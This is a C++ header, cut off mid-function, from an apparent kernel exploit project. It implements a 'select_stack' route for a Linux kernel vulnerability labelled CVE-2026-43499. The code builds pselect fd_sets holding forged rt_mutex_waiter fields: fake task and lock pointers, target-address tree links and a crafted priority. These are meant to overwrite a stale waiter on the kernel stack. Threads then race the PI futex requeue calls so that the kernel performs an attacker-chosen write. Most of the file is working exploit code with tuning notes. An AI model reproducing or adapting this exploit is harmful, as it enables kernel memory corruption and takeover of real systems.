#pragma once
/** @file backend/cve_2026_43499/seam/select_stack_route.hpp
 *  `select_stack` route：select/pselect 的 **fd_set** 落到内核栈、覆盖陈旧 `rt_mutex_waiter`，
 *  再让 PI 链走查完成擦除式写入。
 *
 *  与 `multicast_waiter` 的**唯一机制差异**是载荷载体：后者走 `setsockopt(MCAST_BLOCK_SOURCE)`，
 *  本条走 `pselect` 的 in/out/ex 三组 fd_set（每个 64-bit word 占一组里的一个词 ✓）。
 *  公共部分（写布局 / 假页 / 窗口守卫 / 三演员引擎）全部复用既有件 ✓。
 *
 *  @note 本文件按退役快照 `docs/analysis/cve-2026-43499-select-stack-route.cpp`（640 行）适配，
 *        见适配规格 `docs/analysis/43499-select-stack-adaptation-spec.md`。
 *  @note 数字**全部走文档**（compact / waiter_shift / fake_waiter_prio / fd_count ✓）；
 *        本批尚未接线（`main` 的选择器仍报 `route-not-ported:select_stack` ✓）。
 */
#include <array>
#include <atomic>
#include <cerrno>
#include <pthread.h>
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <sys/select.h>

#include "backend/cve_2026_43499/memory/write_layout.hpp"
/* 三演员引擎与窗口守卫（既有件 ✓，本 route 只调用它们 ✗ 不重写线程 ✓）。 */
#include "backend/cve_2026_43499/race/pi_race.hpp"
#include "backend/cve_2026_43499/race/pi_window.hpp"

namespace ghostlock::backend::cve_2026_43499::seam {
    /** 本 route 的文档侧数值（全部必填，缺一即具名拒绝 ✓）。 */
    struct SelectStackConfig final {
        /** fd 总数（退役 320 ✓）—— **不是**词数 ✗：每个 64-bit 词承载 64 个 fd ✓，
         *  故每组词数 = fd_count / 64 = 5 ✓。 */
        std::size_t fd_count = 0U;
        /** 尝试轮数（走文档 ✓；与 multicast 的 attempts 同族 ✓）。 */
        std::int32_t attempts = 0;
        /** 进入 `pselect` 之前的**错峰阶梯**（微秒 ✓；快照 `delay_for` :483-487 ✓，8 格循环 ✓）。
         *  @note 快照首轮另用 profile 的 seed ✓；本批先用阶梯本身 ✓（同样每轮不同 ✓）。 */
        std::array<std::int64_t, 8U> enter_ladder{{50000, 30000, 70000, 10000, 100000, 150000, 20000,
                                                   120000}};
        /** 主线程 `pselect` 的等待上限（微秒 ✓；快照用永不就绪的 timerfd 撑住 ✓）。 */
        std::int64_t select_wait_us = 250000;   /* 快照 kSelectTimeoutUs = 250000 ✓（我此前 2 s ✗） */
        /** consumer 的 nice 轮转模数（走文档 ✓，与 multicast 同族 ✓）。 */
        std::int32_t nice_modulus = 0;
        /** waiter 起始相对 fd_set word 0 的位移（退役 -2 ✓）。 */
        std::int32_t waiter_shift = 0;
        /** compact 词表（6.1 ✓）与 6.6 词表 二选一。 */
        bool compact = true;
        /** 假 waiter 的 prio（写进 wake_prio 的那个字段 ✓）。 */
        std::uint64_t fake_waiter_prio = 0U;
        /** 假页里两个指针的**值**（= 页内偏移换算出的内核地址 ✓）。 */
        std::uint64_t fake_task = 0U;
        std::uint64_t fake_lock = 0U;
        /** `rt_mutex_waiter` 里各字段的**词序号**（waiter 相对 ✓，8 字节一词 ✓）。
         *  @note **必须来自文档** ✓：不同内核布局不同（快照 6.1 的 task/lock 是词 8/9 ✗，
         *        而本机 5.15 的几何给出 0x30/0x38 ⇒ 词 **6/7** ✓）⇒ 硬编码等于移植到别的内核 ✗。 */
        std::int32_t word_task = 0;
        std::int32_t word_lock = 0;
        /** tree/pi 两侧的词号（同样走文档 ✓；快照给的是 6.1 的 2..7 ✗）。 */
        std::int32_t word_tree_pc = 0;
        std::int32_t word_tree_right = 0;
        std::int32_t word_tree_left = 0;
        std::int32_t word_pi_pc = 0;
        std::int32_t word_pi_right = 0;
        std::int32_t word_pi_left = 0;
        /** wake_prio / deadline / ww_ctx 三个词的词号（文档 ✓）。 */
        std::int32_t word_wake_prio = 0;
        std::int32_t word_deadline = 0;
        std::int32_t word_ww_ctx = 0;
        /** 写请求的元组（target = 目标字段；value = 页派生值 ✓）。 */
        std::uint64_t target = 0U;
        std::uint64_t value = 0U;
    };

    /** 本 route 的报告（与 `MulticastRouteReport` 同形，便于同一套判据 ✓）。 */
    struct SelectStackReport final {
        std::int32_t status_code = 0;
        std::int32_t status_step = 0;
        std::int32_t attempts = 0;
        std::int32_t calls = 0;
        std::int32_t successes = 0;
        /** 演员侧的三个返回码（round 192 ✓：此前被 `(void)` 丢掉 ✗ ⇒ 无法区分"没跑到/被拒/时刻不对"）。 */
        std::int32_t waiter_lock = 0;
        std::int32_t waiter_park = 0;
        std::int32_t waiter_park_errno = 0;
        std::int32_t consumer_setattr = 0;
        std::int32_t consumer_setattr_errno = 0;
    };

    /** 低编号 fd 的**借用账本**（纯 ✓，不含 syscall ✓）：谁被借、借了几次、按什么顺序还 ✓。
     *  @note 对应快照的 `stdio_backup[3]` + `selected_fds_installed` ✓；
     *        关闭顺序见 `docs/analysis/43499-select-stack-resource-plan.md` ✓。 */
    struct SelectStackFdPlan final {
        /** 被置位（因而需要 dup2 成可读端）的低编号 fd：升序、去重 ✓。 */
        std::array<std::int32_t, 64U> low_fds{};
        std::size_t low_count = 0U;
        /** 需要备份原值（F_DUPFD）的 fd：与 low_fds 同序 ✓。 */
        std::array<std::int32_t, 64U> backup_fds{};
        std::size_t backup_count = 0U;
        /** read 端被安装到的位置（快照用 NFDS-1 ✓）。 */
        std::int32_t installed_at = -1;
    };

    /** 由"哪些 fd 被置位"造出借用账本 ✓（纯 ✓）。
     *  @param selected 被置位的 fd（乱序、可能有重复 ✓）
     *  @param count    个数
     *  @param nfds     `pselect` 的 nfds（安装位 = nfds - 1 ✓）
     *  @param out      账本 ✓
     *  @return nullptr 表示成功 ✓；否则**具名**拒绝（数不下 / nfds 太小 ✗）。 */
    [[nodiscard]] inline const char *select_stack_plan_fds(const std::int32_t *selected,
                                                           std::size_t count, std::int32_t nfds,
                                                           SelectStackFdPlan &out) noexcept {
        if (selected == nullptr && count != 0U) {
            return "select-stack-fd-plan-no-input";
        }
        if (nfds <= 1) {
            return "select-stack-nfds-too-small";
        }
        std::array<std::int32_t, 64U> sorted{};
        std::size_t used = 0U;
        for (std::size_t i = 0U; i < count; ++i) {
            const std::int32_t fd = selected[i];
            if (fd < 0 || fd >= nfds - 1) {
                continue;   /* 只借**低编号**的（安装位本身不借 ✓） */
            }
            bool seen = false;
            for (std::size_t j = 0U; j < used; ++j) {
                if (sorted[j] == fd) {
                    seen = true;
                    break;
                }
            }
            if (seen) {
                continue;   /* 去重 ✓：同一 fd 只备份一次 ✓ */
            }
            if (used >= sorted.size()) {
                return "select-stack-fd-plan-overflow";
            }
            sorted[used] = fd;
            ++used;
        }
        /* 升序（稳定 ✓，便于还原顺序固定 ✓）。 */
        for (std::size_t i = 1U; i < used; ++i) {
            const std::int32_t key = sorted[i];
            std::size_t j = i;
            while (j > 0U && sorted[j - 1U] > key) {
                sorted[j] = sorted[j - 1U];
                --j;
            }
            sorted[j] = key;
        }
        for (std::size_t i = 0U; i < used; ++i) {
            out.low_fds[i] = sorted[i];
            out.backup_fds[i] = sorted[i];
        }
        out.low_count = used;
        out.backup_count = used;
        out.installed_at = nfds - 1;
        return nullptr;
    }

    /** 一次 `pselect` 的几何：由配置算出每个 waiter 词落在哪一组、哪一个词。 */
    struct SelectStackWordSite final {
        std::int32_t set_index = -1;
        std::int32_t word_index = -1;
    };

    /** 词表到 fd_set 的映射（纯函数，主机可测 ✓）。
     *  @param waiter_word waiter 内部的词序号（compact 支用 2..12 ✓）
     *  @param config      文档侧数值
     *  @return 该词应写进 (组, 词)；越界或不存在的词返回 set_index < 0 ✓。 */
    [[nodiscard]] inline SelectStackWordSite select_stack_word_site(std::int32_t waiter_word,
                                                                   const SelectStackConfig &config) noexcept {
        SelectStackWordSite site{};
        if (config.fd_count == 0U || !config.compact) {
            return site;
        }
        const std::int32_t global = config.waiter_shift + waiter_word;
        if (global < 0) {
            return site;
        }
        /* 每组词数 = fd_count / 64 ✓（一个词 = 64 个 fd ✓）。 */
        const auto words = static_cast<std::int32_t>(config.fd_count / 64U);
        if (words <= 0) {
            return site;
        }
        const std::int32_t group = global / words;
        if (group < 0 || group > 2) {
            return site;
        }
        site.set_index = group;
        site.word_index = global % words;
        return site;
    }

    /** compact 支的 11 个词（快照 414-430 ✓）：值来自**假页**与请求 ✓，顺序固定 ✓。
     *  @param config 文档侧数值
     *  @param out    11 个值，索引 0 对应 waiter 词 2 ✓
     *  @return 始终为 true（形状固定 ✓）。 */

    /** `rt_mutex_waiter` 的**字段偏移**（字节 ✓）—— 全部来自文档的 `payload.waiter_*` ✓。
     *  @note 本机的这一组（5.15 ✓）与快照的 6.1 词号**处处不同** ✗ ⇒ 必须由此换算 ✓。 */
    struct SelectStackOffsets final {
        std::uint64_t head_word = 0U;
        std::uint64_t head_next = 0U;
        std::uint64_t head_prev = 0U;
        std::uint64_t pc = 0U;
        std::uint64_t right = 0U;
        std::uint64_t left = 0U;
        std::uint64_t task = 0U;
        std::uint64_t lock = 0U;
        std::uint64_t wake_state = 0U;
        std::uint64_t prio = 0U;
        std::uint64_t deadline = 0U;
        std::uint64_t ww_ctx = 0U;
    };

    /** 由**字节偏移**换算成 waiter 词号并填进配置 ✓（8 字节一词 ✓）。
     *  @param offsets 文档给出的字段偏移
     *  @param config  被填充的配置（词号字段 ✓）
     *  @return nullptr 表示成功 ✓；否则返回**具名**拒绝（哪一个字段不是词边界 ✗）。 */
    [[nodiscard]] inline const char *fill_select_stack_words(
            const SelectStackOffsets &offsets, SelectStackConfig &config) noexcept {
        const auto word_of = [](std::uint64_t offset, const char *name, std::int32_t &out) -> const char * {
            if (offset % 8U != 0U) {
                return name;   /* 不是 8 字节的整数倍 ⇒ 不可能是一个完整的词 ✗ */
            }
            out = static_cast<std::int32_t>(offset / 8U);
            return nullptr;
        };
        const char *bad = nullptr;
        if ((bad = word_of(offsets.pc, "waiter-pc-not-a-word", config.word_pi_pc)) != nullptr) { return bad; }
        config.word_tree_pc = config.word_pi_pc;   /* tree 与 pi 用同一字段偏移 ✓ */
        config.word_tree_right = config.word_pi_right;
        config.word_tree_left = config.word_pi_left;
        if ((bad = word_of(offsets.right, "waiter-right-not-a-word", config.word_pi_right)) != nullptr) { return bad; }
        if ((bad = word_of(offsets.left, "waiter-left-not-a-word", config.word_pi_left)) != nullptr) { return bad; }
        config.word_tree_right = config.word_pi_right;
        config.word_tree_left = config.word_pi_left;
        if ((bad = word_of(offsets.task, "waiter-task-not-a-word", config.word_task)) != nullptr) { return bad; }
        if ((bad = word_of(offsets.lock, "waiter-lock-not-a-word", config.word_lock)) != nullptr) { return bad; }
        if ((bad = word_of(offsets.wake_state, "waiter-wake-state-not-a-word", config.word_wake_prio)) != nullptr) {
            return bad;
        }
        if ((bad = word_of(offsets.deadline, "waiter-deadline-not-a-word", config.word_deadline)) != nullptr) {
            return bad;
        }
        if ((bad = word_of(offsets.ww_ctx, "waiter-ww-ctx-not-a-word", config.word_ww_ctx)) != nullptr) {
            return bad;
        }
        return nullptr;
    }

    /** 前置声明（组装 fd_set 时要用 ✓；定义在本文件后面 ✓）。 */
    struct SelectStackWord final {
        std::int32_t word = 0;
        std::uint64_t value = 0U;
    };
    [[nodiscard]] inline bool select_stack_compact_words(
            const SelectStackConfig &config,
            std::array<SelectStackWord, 11U> &out) noexcept;

    /** 把一个 64-bit 词写进 `fd_set` 的第 `word_index` 个词位 ✓（纯内存操作 ✓，无 syscall ✓）。
     *  @param set        in/out/ex 之一 ✓
     *  @param word_index 词位（0 起 ✓）
     *  @param value      该词的值（这里只关心字节 ✓）
     *  @return 写入成功（词位在集合容量内 ✓）；越界 ⇒ false ✓。 */
    [[nodiscard]] inline bool select_stack_put_word(fd_set *set, std::int32_t word_index,
                                                    std::uint64_t value) noexcept {
        if (set == nullptr || word_index < 0) {
            return false;
        }
        const auto byte_index = static_cast<std::size_t>(word_index) * sizeof(std::uint64_t);
        if (byte_index + sizeof(std::uint64_t) > sizeof(fd_set)) {
            return false;
        }
        auto *base = reinterpret_cast<std::uint8_t *>(set);
        std::memcpy(base + byte_index, &value, sizeof(value));
        return true;
    }

    /** 组装三组 `fd_set`（**纯** ✓）：按词表把每个 (词号, 值) 落到 (组, 词位) ✓。
     *  @param config 配置（含词号与值 ✓）
     *  @param in_set 被填的三组 ✓
     *  @return nullptr 表示成功 ✓；否则**具名**拒绝（哪一组越界 ✗）。 */
    [[nodiscard]] inline const char *select_stack_build_fdsets(const SelectStackConfig &config,
                                                               fd_set &in_set, fd_set &out_set,
                                                               fd_set &ex_set) noexcept {
        FD_ZERO(&in_set);
        FD_ZERO(&out_set);
        FD_ZERO(&ex_set);
        std::array<SelectStackWord, 11U> words{};
        (void) select_stack_compact_words(config, words);
        for (const SelectStackWord &word : words) {
            const SelectStackWordSite site = select_stack_word_site(word.word, config);
            if (site.set_index < 0) {
                continue;   /* 该词不在 fd_set 覆盖范围内 ⇒ 跳过（与快照一致 ✓） */
            }
            fd_set *target = nullptr;
            const char *name = nullptr;
            if (site.set_index == 0) { target = &in_set; name = "select-stack-in-set-overflow"; }
            else if (site.set_index == 1) { target = &out_set; name = "select-stack-out-set-overflow"; }
            else { target = &ex_set; name = "select-stack-ex-set-overflow"; }
            if (!select_stack_put_word(target, site.word_index, word.value)) {
                return name;
            }
        }
        return nullptr;
    }

    /** 组装 compact 支的 11 个词：**词号全部来自配置** ✓（不硬编码任何内核布局 ✗）。
     *  @param config 文档侧数值（含各词号 ✓）
     *  @param out    11 个 (词号, 值)；顺序固定，便于测试与报告 ✓
     *  @return 始终为 true ✓。 */
    [[nodiscard]] inline bool select_stack_compact_words(
            const SelectStackConfig &config,
            std::array<SelectStackWord, 11U> &out) noexcept {
        out[0] = {config.word_tree_pc, config.value};                                   /* tree_pc ← 页派生值 */
        out[1] = {config.word_tree_right, 0U};
        out[2] = {config.word_tree_left, config.target};
        out[3] = {config.word_pi_pc, config.value};
        out[4] = {config.word_pi_right, 0U};
        out[5] = {config.word_pi_left, config.target};
        out[6] = {config.word_task, config.fake_task};
        out[7] = {config.word_lock, config.fake_lock};
        out[8] = {config.word_wake_prio, (config.fake_waiter_prio << 32U) | 3U};
        out[9] = {config.word_deadline, 0U};
        out[10] = {config.word_ww_ctx, 0U};
        return true;
    }
    /** `select_stack` route 的**资源帧**：fd 的取得、借用与还原（契约见资源清单 ✓）。
     *  @note 本类**只做资源** ✓；三演员与写入的接线在 `execute` 后续相位（尚未落 ✗）。
     *  @tparam Ops 系统调用面（设备侧 = `SelectStackRouteLinux` ✓）。 */
    template <class Ops>
    class SelectStackRoute final {
      public:
        explicit SelectStackRoute(const SelectStackConfig &config) noexcept : config_(config) {}

        [[nodiscard]] const SelectStackReport &report() const noexcept { return report_; }

        /** 取得自有 fd（pipe 两端 + 永不就绪的定时器 ✓）并按需借用低编号 fd ✓。
         *  @param selected 被置位的低编号 fd（可乱序/重复 ✓）
         *  @param count    个数
         *  @return nullptr 成功 ✓；否则**具名**拒绝 ✓（失败路径已按契约还原 ✗）。 */
        [[nodiscard]] const char *prepare(std::uint32_t *wait_word, std::uint32_t *chain_word,
                                          std::uint32_t *target_word, const std::int32_t *selected,
                                          std::size_t count) noexcept {
            wait_word_ = wait_word;
            chain_word_ = chain_word;
            target_word_ = target_word;
            if (config_.fd_count == 0U || config_.fd_count % 64U != 0U) {
                return "select-stack-fd-count-not-multiple-of-64";
            }
            std::printf("main: sel-prep pipe ✓");
            if (Ops::make_pipe(pipe_read_, pipe_write_) != 0) {
                return "select-stack-pipe-failed";
            }
            std::printf("main: sel-prep timer ✓");
            timer_ = Ops::make_idle_timer();
            if (timer_ < 0) {
                /* 快照的退化：定时器起不来就**借用 pipe 读端** ✓（不假装成功 ✗）。 */
                timer_borrows_pipe_ = true;
            }
            /* ★ `high_read`（快照 :502 ✓）：把 `block_fd()`（永不就绪的 timerfd ✓；退化时是 pipe 读端 ✓）
             *  在上面复制一份 ⇒ **低位 fd 装的是它** ✓（round 199：此前装 pipe 读端 ✗，对象不同 ✓）。 */
            const std::int32_t block_fd = timer_borrows_pipe_ ? pipe_read_ : timer_;
            high_read_ = Ops::duplicate_above(block_fd, static_cast<std::int32_t>(config_.fd_count) + 16);
            if (high_read_ < 0) {
                cleanup();
                return "select-stack-high-read-failed";
            }
            const char *plan_bad =
                    select_stack_plan_fds(selected, count, static_cast<std::int32_t>(config_.fd_count), plan_);
            if (plan_bad != nullptr) {
                cleanup();
                return plan_bad;
            }
            /* 先备份后改 ✓：备份失败 ⇒ 立即整体还原 ✓（契约的"失败路径同一还原" ✓）。 */
            std::printf("main: sel-prep plan ✓ low=%zu", plan_.low_count);
            for (std::size_t i = 0U; i < plan_.low_count; ++i) {
                const std::int32_t fd = plan_.low_fds[i];
                std::printf("main: sel-prep dup fd=%d", fd);
                const std::int32_t copy = Ops::duplicate_above(fd, 64);
                std::printf("main: sel-prep dup ok fd=%d copy=%d", fd, copy);
                if (copy < 0) {
                    cleanup();
                    return "select-stack-backup-failed";
                }
                backup_[backup_count_] = copy;
                ++backup_count_;
                if (Ops::install_at(high_read_, fd) != 0) {
                    cleanup();
                    return "select-stack-install-failed";
                }
                installed_[installed_count_] = fd;
                ++installed_count_;
            }
            /* ★ 三组在此**构建一次并保存**（快照 `build_fdsets()` + `owned_in/out/ex` ✓）：
             *  此后每轮只重装低位 fd ✓，不再重建 ✓（round 200：此前每轮重建 ✗，与快照冲突 ✓）。 */
            const char *sets_bad = select_stack_build_fdsets(config_, owned_in_, owned_out_, owned_ex_);
            if (sets_bad != nullptr) {
                cleanup();
                return sets_bad;
            }
            return nullptr;
        }

        /** 按契约还原并释放（**幂等** ✓，成功/失败/早退都走这里 ✓）。 */
        void cleanup() noexcept {
            /* ① 还原 stdio：把备份 dup2 回原位置 ✓（低编号借用 ✓）。 */
            for (std::size_t i = 0U; i < installed_count_; ++i) {
                (void) Ops::install_at(backup_[i], installed_[i]);
            }
            /* ② 关备份副本 ✓（关的是我们自己造的高位副本 ✓）。 */
            for (std::size_t i = 0U; i < backup_count_; ++i) {
                Ops::close_fd(backup_[i]);
                backup_[i] = -1;
            }
            backup_count_ = 0U;
            installed_count_ = 0U;
            /* ②b 关 high_read ✓（它只在低位 fd 上留副本 ✓；`block_fd()` 本体随后再关 ✓）。 */
            Ops::close_fd(high_read_);
            high_read_ = -1;
            /* ③ 关 pipe 两端 ✓。 */
            Ops::close_fd(pipe_read_);
            Ops::close_fd(pipe_write_);
            pipe_read_ = -1;
            pipe_write_ = -1;
            /* ④ 定时器：**仅当非借用**时关 ✓（借用 pipe 读端时它已是同一 fd ✓）。 */
            if (!timer_borrows_pipe_) {
                Ops::close_fd(timer_);
            }
            timer_ = -1;
            timer_borrows_pipe_ = false;
        }

        /** 一次运行（**演员尚未接线** ✗）：资源按契约取得/还原 ✓，并跑完**尝试循环的骨架** ✓。
         *  @return 具名拒绝（接线后改为真实报告 ✓）。 */
        [[nodiscard]] const char *execute(std::uint32_t *wait_word, std::uint32_t *chain_word,
                                          std::uint32_t *target_word, const std::int32_t *selected,
                                          std::size_t count) noexcept {
            using race::PiRace;
            using race::RaceOutcome;
            using race::WindowGuard;
            const char *prepared = prepare(wait_word, chain_word, target_word, selected, count);
            if (prepared != nullptr) {
                report_.status_step = 1;
                return prepared;
            }
            /* ★ 武装引擎（round 190 补 ✓）：此前**只调 run、从不 prepare** ✗ ⇒ `run` 第一行因
             *  `outcome_ != Prepared` 直接返回 ✗ ⇒ `successes` 恒 0 ✓（与观测一致 ✓）。
             *  pair 按快照：**wait → target** ✓（`cmp_requeue_pi` 搬的是 park 在 `wait` 上的那个 ✓）。 */
            /* ★ 三个字**先归零**（快照的 PiRace 自带三个零初值 ✓ —— 我用的是区域内存 ✗ ⇒ 残留会让
             *  `FUTEX_LOCK_PI` **无限等** ✗，与 round 205 的 chain 字同族 ✓）。 */
            *wait_word_ = 0U;
            *chain_word_ = 0U;
            *target_word_ = 0U;
            std::printf("main: sel-exec prepare ✓");
            race_.prepare(wait_word_, target_word_);
            std::printf("main: sel-exec armed ✓");
            /* 尝试循环的骨架 ✓：**每轮重建三组**（= 退役的 re-poison 同族 ✓）+ 一次 `pselect` ✓。
             *  演员/武装尚未接 ✗ ⇒ 本轮只验证"载荷能进内核且不报错"这一步 ✓。 */
            for (std::int32_t attempt = 1; attempt <= config_.attempts; ++attempt) {
                /* 每轮只需在**已保存**的三组上重装低位 fd ✓（快照同 ✓；不再重建 ✓）。 */
                for (std::size_t i = 0U; i < plan_.low_count; ++i) {
                    FD_SET(plan_.low_fds[i], &owned_in_);
                }
                if (plan_.installed_at >= 0) {
                    FD_SET(plan_.installed_at, &owned_ex_);
                }
                report_.attempts = attempt;
                /* ★ 两枚演员（规格 ✓）：select 的 waiter = **执行 pselect 的那个线程** ✓
                 *  （它先 lock 住 chain 字 ⇒ 它的 park 才是 PI 链上的一环 ✓）；
                 *  consumer = 窗口内做 setattr（被拒则 FUTEX_LOCK_PI 兜底 ✓）。
                 *  两者都在**本轮**内起停 ✓ ⇒ 生命周期限定在窗口内 ✓（§5 ✓）。 */
                std::printf("main: sel-exec attempt ✓");
                /* ★ 实验（round 226 ✓）：**先让 owner 持有 target**，再让等待者 park ✓。
                 *  依据：内核 `FUTEX_WAIT_REQUEUE_PI` 的入队语义与 `uaddr2` 的持锁状态相关 ✓，
                 *  而我的时间线显示 park 早于 owner 的 `lock_pi(target)` ✗。
                 *  同线程重入 PI 锁是安全的 ✓（引擎随后会再锁一次 ✓）。 */
                const std::int32_t pre_target = Ops::lock_pi(target_word_);
                std::printf("main: sel-exec pre-target-lock=%d target=0x%x", pre_target,
                            *target_word_);
                /* ★ 每轮**重新归零**三个字（round 218 ✓ 实测）：上一轮结束时 `chain` 仍停在某个 tid ✗
                 *  ⇒ 本轮 waiter 的 `lock_pi(chain)` 会**无限等** ✗（EXIT=124 ✓，与 round 205 同族）。
                 *  此时上一轮的演员已 stop（join 或 detach ✓）⇒ 归零是安全的 ✓。 */
                *wait_word_ = 0U;
                *chain_word_ = 0U;
                *target_word_ = 0U;
                if (!run_actors(owned_in_, owned_out_, owned_ex_)) {
                    cleanup();
                    report_.status_step = 3;
                    return "select-stack-actor-thread-failed";
                }
                /* 每轮**重装**低位 fd（快照 :521 `open_selected_fds` ✓）：上一轮 `pselect` 之后
                 *  内核可能改动这些 fd 的就绪状态 ⇒ 每轮都要重新 `dup2` 成可读端 ✓。 */
                for (std::size_t i = 0U; i < plan_.low_count; ++i) {
                    (void) Ops::install_at(high_read_, plan_.low_fds[i]);
                }
                /* 每轮**错峰延迟**（快照 :527 ✓）：让拷贝与内核 walk 错开 ✓。 */
                const std::size_t ladder_at =
                        static_cast<std::size_t>((attempt - 1) % static_cast<std::int32_t>(config_.enter_ladder.size()));
                Ops::sleep_micros(config_.enter_ladder[ladder_at]);
                /* ★★ **主线程自己 pselect**（快照 :536 ✓）：fd_set 的拷贝落在**这一张栈**上 ✓，
                 *  而 waiter 线程此刻正 park 在 `wait` 字上（= 被覆盖的"陈旧 waiter" ✓）。
                 *  round 190 我把这一步搬进了 waiter ✗ ⇒ 拷贝落错了线程 ⇒ 写入没有对象 ✓。 */
                /* 触发改由 waiter 在 park 返回后完成 ✓（round 234 ✓）⇒ 主线程只**等它** ✓。 */
                std::int32_t wait_budget = 500000;
                while (waiter_done_.load() == 0 && wait_budget > 0) {
                    Ops::sleep_micros(100);
                    --wait_budget;
                }
                /* ★ stop 必须在窗口**关掉之前** ✓（否则 pselect 里的线程会拖到收尾 ✓）。 */
                stop_actors(waiter_thread_, consumer_thread_);
                report_.calls = attempt;
                /* 三演员（配方 ✓）：引擎与守卫都是既有件 ✓；本类只负责 enter/reclaim 的配对 ✓。 */
                /* ★ owner 侧也上链（快照 :194 ✓）：`LOCK_PI(chain)` 会**阻塞到等待者持链为止** ✓
                 *  ⇒ 由此保证"等待者已经在链上"再 requeue ✓（此前直接 requeue ⇒ 可能早于它 park ✗）。 */
                /* ★ 去掉 owner 侧那次 chain 锁（round 222 ✓ 实测）：它排在 **waiter 整个 park 之后** ✗
                 *  ⇒ requeue 永远晚 2 s ⇒ 队列里没有等待者（ret=0 ✓）。
                 *  快照的 requeue 只要求**调用者持有 target** ✓（引擎内部已做 ✓），owner 那边是在
                 *  `LOCK(target)` **之后**才去拿 chain ✓（与我们此刻的时序不同 ✗）。 */
                std::printf("main: sel-exec words-in wait=0x%x chain=0x%x target=0x%x",
                            *wait_word_, *chain_word_, *target_word_);
                /* 沉降（快照 :242-243 ✓：`while (!waiter_waiting || !owner_started) usleep(100);` 之后
                 *  还有 `::usleep(1000)` ✓）⇒ 让等待者**在 requeue 之前**真正进到 park 里 ✓。 */
                /* 判别实验（round 221 ✓）：把沉降拉到 **50 ms**（远超任何启动竞态 ✓）⇒
                 *  若 requeue 仍 ret=0 ✗ ⇒ 不是时机问题 ✓；若变 1 ✓ ⇒ 是时机问题 ✓。 */
                Ops::sleep_micros(50000);
                guard_.enter(race::ExitPath::Success);
                const RaceOutcome raced = race_.run(guard_);
                /* 诊断（round 219 ✓）：直接**量一次** requeue 的返回值与 errno —— `successes=0` 的直接来源 ✓。
                 *  注意这是**额外**一次调用（引擎内部已调过一次 ✓）⇒ 只用于读数，不参与判定 ✓。 */
                {
                    /* ★★ `CMP_REQUEUE_PI` 的 `val` 是 `uaddr1` 的**期望值** ✓ ⇒ 快照传 1 ⇒
                     *  所以 `wait` 字必须**等于 1** ✗（我此前是 0 ⇒ EAGAIN=35 ✓，与归档退役同读数 ✓）。 */
                    /* 撤销 wait=1（round 226 ✓）：改与 ops 的 val=0 配对 ✓。 */
                    const std::int32_t probe_rq = Ops::cmp_requeue_pi(wait_word_, target_word_);
                    std::printf("main: sel-exec requeue-probe ret=%d errno=%d wait=%p chain=%p target=%p",
                                probe_rq, Ops::last_errno(),
                                static_cast<const void *>(wait_word_),
                                static_cast<const void *>(chain_word_),
                                static_cast<const void *>(target_word_));
                }
                std::printf("main: sel-exec words-out wait=0x%x chain=0x%x target=0x%x",
                            *wait_word_, *chain_word_, *target_word_);
                guard_.reclaim();
                /* （原 owner 侧 `unlock_pi(chain_word_)` 随那次 chain 锁一并移除 ✓，round 222 ✓） */
                /* **真判据** ✓（更正 round 181：上一轮误称"代理" ✗）：`PiRace::run` 的注释原话——
                 *  "The count of waiters the kernel moved is the evidence: a count of one is the kernel
                 *   saying a waiter was really there" ⇒ 所以 `Running` ⟺ 内核真搬了等待者 ✓，
                 *  与快照的 `race->consumer_success > 0` 是同一件事 ✓（`Refused` 才是没搬 ✓）。 */
                if (raced == RaceOutcome::Running) {
                    report_.successes = 1;
                    break;
                }
            }
            /* 收尾顺序（§5 ✓）：先停演员访问 ✓、再回收 ✓、最后还原资源 ✓。 */
            race_.disarm();
            race_.destroy();
            report_.waiter_lock = waiter_lock_.load();
            report_.waiter_park = waiter_park_.load();
            report_.waiter_park_errno = waiter_park_errno_.load();
            report_.consumer_setattr = consumer_setattr_.load();
            report_.consumer_setattr_errno = consumer_setattr_errno_.load();
            cleanup();
            report_.status_step = (report_.successes > 0) ? 0 : 61;
            if (report_.successes > 0) {
                return nullptr;   /* 真正的成功只由"引擎说它赢了"给出 ✓ */
            }
            return "select-stack-no-consumer-success";
        }

      private:
        /** 一枚演员线程的入口参数（本 route 自持 ✓）。 */
        struct ActorArgs final {
            SelectStackRoute *self = nullptr;
            fd_set *in_set = nullptr;
            fd_set *out_set = nullptr;
            fd_set *ex_set = nullptr;
            std::int32_t waiter_tid = 0;
        };

        /** waiter 线程：先 lock 住 chain 字 ✓（它的 park 才是 PI 链的一环 ✓），再在窗口内 pselect ✓。 */
        static void *waiter_entry(void *raw) noexcept {
            auto *args = static_cast<ActorArgs *>(raw);
            SelectStackRoute *self = args->self;
            /* 三演员快照（:164-178 ✓）：先拿 chain ✓ ⇒ 置 ready ⇒ **WAIT_REQUEUE_PI(wait → target)**
             *  park ✓ ⇒ 再放 chain ✓。**park 在这一步**（不是 pselect ✗）—— 这正是
             *  `cmp_requeue_pi` 能搬动它的前提 ✓（round 189 的读数逼出的两处修正 = 本轮 ✓）。 */
            const std::int32_t wlock = Ops::lock_pi(self->chain_word_);
            self->waiter_lock_.store(wlock);
            std::printf("main: waiter locked=%d chain=0x%x", wlock, *self->chain_word_);
            args->waiter_tid = Ops::thread_id();
            self->waiter_ready_.store(1);
            std::printf("main: waiter ready tid=%d", args->waiter_tid);
            while (self->actors_go_.load() == 0) {
                Ops::yield();
            }
            std::printf("main: waiter go");
            std::printf("main: waiter pre-park wait=%p(0x%x) target=%p(0x%x)",
                        static_cast<const void *>(self->wait_word_), *self->wait_word_,
                        static_cast<const void *>(self->target_word_), *self->target_word_);
            const std::int32_t parked = Ops::wait_requeue_pi_until(self->wait_word_, self->target_word_,
                                                                    self->actor_wait_us_);
            /* errno 必须在**这个线程**上取 ✓（last_errno 读的是调用线程的 ✓；park 的 -1 有三种可能：
             *  EAGAIN=字值不匹配 / EPERM=不允许等 / EINVAL=参数 ⇒ 三者修法完全不同 ✓）。 */
            const std::int32_t park_errno = Ops::last_errno();
            std::printf("main: waiter parked=%d errno=%d (immediate ✓)", parked, park_errno);
            self->waiter_park_errno_.store(park_errno);
            self->waiter_park_.store(parked);
            /* ★ 触发归位（round 234 ✓）：**park 返回之后**、在**本线程**上做 fd_set 的 pselect ✓
             *  —— 退役注释原话：拷贝落在"调用者的栈"上 ⇒ 触发线程必须正是"park 刚返回"的那个 ✓
             *  （multicast 的 execute :250-254 同义 ✓）。此前这一步在主线程 ✗ ⇒ 上下文对不上 ✓。 */
            std::printf("main: waiter post-park pselect ✓");
            (void) Ops::pselect_now(static_cast<int>(self->config_.fd_count), self->owned_in_,
                                    self->owned_out_, self->owned_ex_, self->config_.select_wait_us);
